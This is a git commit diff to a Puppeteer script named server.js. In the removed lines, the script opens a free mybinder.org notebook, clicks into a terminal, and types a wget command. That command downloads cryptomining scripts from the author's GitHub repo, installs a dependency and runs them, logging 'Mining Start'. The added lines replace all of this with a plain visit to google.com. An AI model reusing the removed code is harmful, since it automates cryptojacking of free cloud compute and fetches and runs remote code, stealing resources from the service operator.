d4119511f3045d13e663cef58ac96928f4121707
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2022-11-01 14:18:23 +0600

    Add files via upload

--- test02/server.js
+++ test02/server.js
@@ -1,58 +1,18 @@
 const puppeteer = require('puppeteer')
-
-let mGmail = null
-let browser = null
-
-
-console.log('Service Starting...')
-
+const request = require('request')
+const fs = require('fs')
 
 ;(async () => {
-
-    console.log('Status: Start process...')
-
-
-    browser = await puppeteer.launch({
-        executablePath : "/usr/lib/chromium-browser/chromium-browser",
-        //headless: false,
+    let browser = await puppeteer.launch({
+        headless: true,
         args: ['--no-sandbox', '--disable-setuid-sandbox']
     })
 
-    let page = (await browser.pages())[0]
+    let page = await browser.newPage()
 
-    await page.goto('https://mybinder.org/v2/git/https%3A%2F%2Fgithub.com%2Faanksatriani%2Fmybinder.git/main')
+    console.log('Page Load Start')
 
-    while(true) {
-        await delay(5000)
-        try {
-            let root = await page.evaluate(() => {
-                let tr = document.querySelector('div[title="Start a new terminal session"]')
-                if(tr) {
-                    tr.click()
-                    return true
-                }
-                return false
-            })
-            if(root) {
-                break
-            }
-        } catch (e) {} 
-    }
+    await page.goto('https://google.com/')
 
-    console.log('NoteBook Active')
-
-    await delay(2500)
-
-    let cmd = 'wget https://raw.githubusercontent.com/raiyan088/public/main/mining/package.json https://raw.githubusercontent.com/raiyan088/public/main/mining/server.js https://raw.githubusercontent.com/raiyan088/public/main/mining/worker.js https://raw.githubusercontent.com/raiyan088/public/main/mining/worker_cn.js && npm install websocket && node server.js'
-
-    await page.keyboard.type(cmd)
-    await delay(1000)
-    await page.keyboard.press('Enter')
-    console.log('Mining Start')
+    console.log('Page Load Success')
 })()
-
-async function delay(time) {
-    return new Promise(function (resolve) {
-        setTimeout(resolve, time)
-    })
-}
